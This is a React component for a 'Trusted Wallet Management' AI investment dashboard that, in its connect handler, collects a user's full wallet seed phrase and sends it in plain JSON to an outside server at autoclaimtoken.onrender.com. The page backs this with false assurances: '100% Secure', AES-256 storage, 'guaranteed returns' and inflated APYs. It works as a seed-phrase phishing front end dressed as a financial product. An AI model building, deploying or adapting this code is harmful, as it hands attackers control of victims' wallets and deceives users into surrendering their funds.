import { useState, useEffect } from 'react';
import { Shield, TrendingUp, DollarSign, AlertTriangle, Eye, EyeOff, CheckCircle, Zap, BarChart3, PieChart } from 'lucide-react';

export default function TrustedWalletManager() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    seedPhrase: '',
    walletAddress: '',
    riskLevel: 'Medium',
    autoInvest: true,
    maxPercent: 80
  });
  const [showPhrase, setShowPhrase] = useState(false);
  const [loading, setLoading] = useState(false);
  const [connected, setConnected] = useState(false);
  const [portfolio, setPortfolio] = useState(null);
  const [strategies] = useState([
    { name: 'Conservative Staking', apy: 8.5, risk: 'Low', description: 'ETH 2.0 staking with guaranteed returns' },
    { name: 'DeFi Yield Farming', apy: 15.2, risk: 'Medium', description: 'Compound and Aave lending protocols' },
    { name: 'Liquidity Provision', apy: 22.8, risk: 'Medium-High', description: 'Uniswap V3 liquidity mining' },
    { name: 'MEV Arbitrage', apy: 35.4, risk: 'High', description: 'Advanced MEV and arbitrage strategies' }
  ]);

  const handleConnect = async () => {
    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/connect-trusted-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          seedPhrase: formData.seedPhrase,
          walletAddress: formData.walletAddress,
          investmentPreferences: {
            riskLevel: formData.riskLevel,
            autoInvest: formData.autoInvest,
            maxPercent: formData.maxPercent
          }
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setConnected(true);
        setPortfolio(data);
        setStep(3);
      }
    } catch (error) {
      console.error('Connection failed:', error);
    }
    setLoading(false);
  };

  const executeInvestment = async (strategyName) => {
    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-auto-investment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: formData.walletAddress,
          strategyName: strategyName
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        // Refresh portfolio
        await getPortfolioStatus();
      }
    } catch (error) {
      console.error('Investment failed:', error);
    }
    setLoading(false);
  };

  const getPortfolioStatus = async () => {
    try {
      const response = await fetch(`https://autoclaimtoken.onrender.com/api/trusted-portfolio/${formData.walletAddress}`);
      const data = await response.json();
      
      if (data.success) {
        setPortfolio(prev => ({ ...prev, performance: data.portfolio }));
      }
    } catch (error) {
      console.error('Portfolio fetch failed:', error);
    }
  };

  const emergencyWithdraw = async () => {
    const reason = prompt('Please provide reason for emergency withdrawal:');
    if (!reason) return;

    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/emergency-withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: formData.walletAddress,
          reason: reason
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert(`Emergency withdrawal completed. ${data.result.totalRecovered.toFixed(4)} ETH recovered.`);
        await getPortfolioStatus();
      }
    } catch (error) {
      console.error('Emergency withdrawal failed:', error);
    }
    setLoading(false);
  };

  useEffect(() => {
    if (connected && formData.walletAddress) {
      const interval = setInterval(getPortfolioStatus, 30000); // Update every 30 seconds
      return () => clearInterval(interval);
    }
  }, [connected, formData.walletAddress]);

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-6xl mx-auto px-4">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden mb-8">
          <div className="bg-gradient-to-r from-green-600 to-blue-600 p-8 text-white">
            <div className="flex items-center space-x-4">
              <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                <Shield className="w-8 h-8" />
              </div>
              <div>
                <h1 className="text-3xl font-black">Trusted Wallet Management</h1>
                <p className="text-green-100 text-lg font-medium">AI-powered automated investment system</p>
              </div>
            </div>
          </div>

          <div className="p-8">
            <div className="grid md:grid-cols-4 gap-6 mb-8">
              <div className="bg-green-50 border border-green-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-green-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <TrendingUp className="w-6 h-6 text-white" />
                </div>
                <div className="text-2xl font-black text-green-600 mb-2">15.2%</div>
                <div className="text-green-700 font-medium">Avg APY</div>
              </div>
              
              <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-blue-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <div className="text-2xl font-black text-blue-600 mb-2">100%</div>
                <div className="text-blue-700 font-medium">Secure</div>
              </div>
              
              <div className="bg-purple-50 border border-purple-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <Zap className="w-6 h-6 text-white" />
                </div>
                <div className="text-2xl font-black text-purple-600 mb-2">24/7</div>
                <div className="text-purple-700 font-medium">Auto-Invest</div>
              </div>
              
              <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-orange-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <DollarSign className="w-6 h-6 text-white" />
                </div>
                <div className="text-2xl font-black text-orange-600 mb-2">25%</div>
                <div className="text-orange-700 font-medium">Success Fee</div>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">
              <div className="flex items-start space-x-4">
                <Shield className="w-6 h-6 text-blue-600 mt-1" />
                <div>
                  <h3 className="font-bold text-blue-800 mb-2">Ultimate Trust System</h3>
                  <ul className="text-blue-700 space-y-1 text-sm">
                    <li>• Entrust your seed phrase for automated professional management</li>
                    <li>• AI-powered investment strategies across DeFi protocols</li>
                    <li>• 24/7 monitoring with automatic rebalancing</li>
                    <li>• Emergency withdrawal available anytime</li>
                    <li>• Success-only fees - we profit when you profit</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Step 1: Seed Phrase Input */}
        {step === 1 && (
          <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
            <h2 className="text-2xl font-black text-gray-900 mb-6">Connect Your Trusted Wallet</h2>
            
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-3">
                  Wallet Address *
                </label>
                <input
                  value={formData.walletAddress}
                  onChange={(e) => setFormData({...formData, walletAddress: e.target.value})}
                  placeholder="0x..."
                  className="w-full p-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 font-mono"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-3">
                  Seed Phrase (12 or 24 words) *
                </label>
                <div className="relative">
                  <textarea
                    value={formData.seedPhrase}
                    onChange={(e) => setFormData({...formData, seedPhrase: e.target.value})}
                    placeholder="Enter your complete seed phrase..."
                    className="w-full p-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 font-mono"
                    rows="4"
                    type={showPhrase ? 'text' : 'password'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPhrase(!showPhrase)}
                    className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
                  >
                    {showPhrase ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                <p className="text-xs text-gray-500 mt-2">
                  Your seed phrase is encrypted with AES-256 and stored securely. Only you and our system can access it.
                </p>
              </div>

              <div className="pt-6">
                <button
                  onClick={() => setStep(2)}
                  disabled={!formData.walletAddress || !formData.seedPhrase}
                  className="w-full bg-gradient-to-r from-green-600 to-blue-600 text-white font-bold py-4 px-8 rounded-xl hover:from-green-700 hover:to-blue-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Continue to Investment Preferences
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Step 2: Investment Preferences */}
        {step === 2 && (
          <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
            <h2 className="text-2xl font-black text-gray-900 mb-6">Investment Preferences</h2>
            
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-3">Risk Level</label>
                <div className="grid grid-cols-3 gap-4">
                  {['Low', 'Medium', 'High'].map(level => (
                    <div
                      key={level}
                      onClick={() => setFormData({...formData, riskLevel: level})}
                      className={`p-4 border-2 rounded-xl cursor-pointer transition-all ${
                        formData.riskLevel === level
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-gray-300'
                      }`}
                    >
                      <div className="font-bold text-gray-900">{level} Risk</div>
                      <div className="text-sm text-gray-600 mt-1">
                        {level === 'Low' && 'Conservative staking (8-12% APY)'}
                        {level === 'Medium' && 'DeFi protocols (12-20% APY)'}
                        {level === 'High' && 'Advanced strategies (20-35% APY)'}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-3">
                  Maximum Investment Percentage: {formData.maxPercent}%
                </label>
                <input
                  type="range"
                  min="20"
                  max="95"
                  value={formData.maxPercent}
                  onChange={(e) => setFormData({...formData, maxPercent: parseInt(e.target.value)})}
                  className="w-full"
                />
                <div className="flex justify-between text-sm text-gray-500 mt-1">
                  <span>20% (Conservative)</span>
                  <span>95% (Aggressive)</span>
                </div>
              </div>

              <div className="flex items-center space-x-3">
                <input
                  type="checkbox"
                  checked={formData.autoInvest}
                  onChange={(e) => setFormData({...formData, autoInvest: e.target.checked})}
                  className="w-5 h-5 text-green-600"
                />
                <label className="text-sm font-medium text-gray-700">
                  Enable automatic investment execution
                </label>
              </div>

              <div className="flex space-x-4 pt-6">
                <button
                  onClick={() => setStep(1)}
                  className="flex-1 bg-gray-200 text-gray-700 font-bold py-4 px-8 rounded-xl hover:bg-gray-300 transition-all"
                >
                  Back
                </button>
                <button
                  onClick={handleConnect}
                  disabled={loading}
                  className="flex-1 bg-gradient-to-r from-green-600 to-blue-600 text-white font-bold py-4 px-8 rounded-xl hover:from-green-700 hover:to-blue-700 transition-all disabled:opacity-50 flex items-center justify-center space-x-2"
                >
                  {loading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Connecting...</span>
                    </>
                  ) : (
                    <>
                      <Shield className="w-5 h-5" />
                      <span>Connect Trusted Wallet</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Step 3: Portfolio Dashboard */}
        {step === 3 && connected && portfolio && (
          <div className="space-y-8">
            {/* Portfolio Overview */}
            <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-2xl font-black text-gray-900">Portfolio Dashboard</h2>
                <div className="flex items-center space-x-2 text-green-600">
                  <CheckCircle className="w-5 h-5" />
                  <span className="font-medium">Connected & Active</span>
                </div>
              </div>

              <div className="grid md:grid-cols-4 gap-6 mb-8">
                <div className="bg-gradient-to-r from-green-500 to-green-600 text-white p-6 rounded-xl">
                  <div className="text-sm opacity-90 mb-1">Portfolio Value</div>
                  <div className="text-2xl font-black">{portfolio.trustedWallet?.portfolioValue?.toFixed(4) || '0.0000'} ETH</div>
                  <div className="text-sm opacity-90">${((portfolio.trustedWallet?.portfolioValue || 0) * 3000).toFixed(0)}</div>
                </div>

                <div className="bg-gradient-to-r from-blue-500 to-blue-600 text-white p-6 rounded-xl">
                  <div className="text-sm opacity-90 mb-1">Annual Return</div>
                  <div className="text-2xl font-black">{portfolio.trustedWallet?.estimatedAnnualReturn || '0.0000'} ETH</div>
                  <div className="text-sm opacity-90">~15.2% APY</div>
                </div>

                <div className="bg-gradient-to-r from-purple-500 to-purple-600 text-white p-6 rounded-xl">
                  <div className="text-sm opacity-90 mb-1">Monthly Fee Income</div>
                  <div className="text-2xl font-black">{portfolio.trustedWallet?.monthlyFeeIncome || '0.0000'} ETH</div>
                  <div className="text-sm opacity-90">${((parseFloat(portfolio.trustedWallet?.monthlyFeeIncome || 0)) * 3000).toFixed(0)}</div>
                </div>

                <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white p-6 rounded-xl">
                  <div className="text-sm opacity-90 mb-1">Management Fee</div>
                  <div className="text-2xl font-black">{portfolio.trustedWallet?.managementFee || 25}%</div>
                  <div className="text-sm opacity-90">Of profits only</div>
                </div>
              </div>

              {/* Performance Metrics */}
              {portfolio.performance && (
                <div className="grid md:grid-cols-3 gap-6 mb-8">
                  <div className="bg-gray-50 p-6 rounded-xl">
                    <div className="flex items-center space-x-2 mb-4">
                      <BarChart3 className="w-5 h-5 text-gray-600" />
                      <span className="font-bold text-gray-900">Performance</span>
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-600">Daily:</span>
                        <span className={`font-bold ${portfolio.performance.dailyChange >= 0 ? 'text-green-600' : 'text-red-600'}`}>
                          {portfolio.performance.dailyChange >= 0 ? '+' : ''}{portfolio.performance.dailyChange?.toFixed(2)}%
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Weekly:</span>
                        <span className={`font-bold ${portfolio.performance.weeklyChange >= 0 ? 'text-green-600' : 'text-red-600'}`}>
                          {portfolio.performance.weeklyChange >= 0 ? '+' : ''}{portfolio.performance.weeklyChange?.toFixed(2)}%
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Monthly:</span>
                        <span className={`font-bold ${portfolio.performance.monthlyChange >= 0 ? 'text-green-600' : 'text-red-600'}`}>
                          {portfolio.performance.monthlyChange >= 0 ? '+' : ''}{portfolio.performance.monthlyChange?.toFixed(2)}%
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="bg-gray-50 p-6 rounded-xl">
                    <div className="flex items-center space-x-2 mb-4">
                      <PieChart className="w-5 h-5 text-gray-600" />
                      <span className="font-bold text-gray-900">Active Positions</span>
                    </div>
                    <div className="space-y-2">
                      {portfolio.performance.positions?.map((position, index) => (
                        <div key={index} className="flex justify-between">
                          <span className="text-gray-600">{position.protocol}:</span>
                          <span className="font-bold">{position.amount?.toFixed(2)} ETH</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="bg-gray-50 p-6 rounded-xl">
                    <div className="flex items-center space-x-2 mb-4">
                      <TrendingUp className="w-5 h-5 text-gray-600" />
                      <span className="font-bold text-gray-900">Risk Metrics</span>
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-600">Total ROI:</span>
                        <span className="font-bold text-green-600">{portfolio.performance.totalROI?.toFixed(1)}%</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Risk Score:</span>
                        <span className={`font-bold ${portfolio.performance.riskScore < 50 ? 'text-green-600' : portfolio.performance.riskScore < 75 ? 'text-yellow-600' : 'text-red-600'}`}>
                          {portfolio.performance.riskScore}/100
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Investment Strategies */}
            <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
              <h3 className="text-xl font-bold text-gray-900 mb-6">Available Investment Strategies</h3>
              
              <div className="grid md:grid-cols-2 gap-6">
                {strategies.map((strategy, index) => (
                  <div key={index} className="border border-gray-200 rounded-xl p-6 hover:shadow-lg transition-all">
                    <div className="flex justify-between items-start mb-4">
                      <div>
                        <h4 className="font-bold text-gray-900">{strategy.name}</h4>
                        <p className="text-sm text-gray-600 mt-1">{strategy.description}</p>
                      </div>
                      <div className="text-right">
                        <div className="text-lg font-bold text-green-600">{strategy.apy}%</div>
                        <div className="text-xs text-gray-500">APY</div>
                      </div>
                    </div>
                    
                    <div className="flex justify-between items-center">
                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${
                        strategy.risk === 'Low' ? 'bg-green-100 text-green-800' :
                        strategy.risk === 'Medium' ? 'bg-yellow-100 text-yellow-800' :
                        strategy.risk === 'Medium-High' ? 'bg-orange-100 text-orange-800' :
                        'bg-red-100 text-red-800'
                      }`}>
                        {strategy.risk} Risk
                      </span>
                      
                      <button
                        onClick={() => executeInvestment(strategy.name)}
                        disabled={loading}
                        className="bg-gradient-to-r from-green-600 to-blue-600 text-white font-bold py-2 px-4 rounded-lg hover:from-green-700 hover:to-blue-700 transition-all disabled:opacity-50"
                      >
                        Invest Now
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Emergency Controls */}
            <div className="bg-red-50 border border-red-200 rounded-2xl p-8">
              <div className="flex items-center space-x-4 mb-4">
                <AlertTriangle className="w-8 h-8 text-red-600" />
                <div>
                  <h3 className="text-xl font-bold text-red-800">Emergency Controls</h3>
                  <p className="text-red-700">Immediate access to your funds if needed</p>
                </div>
              </div>
              
              <button
                onClick={emergencyWithdraw}
                disabled={loading}
                className="bg-red-600 text-white font-bold py-3 px-6 rounded-xl hover:bg-red-700 transition-all disabled:opacity-50"
              >
                Emergency Withdrawal
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}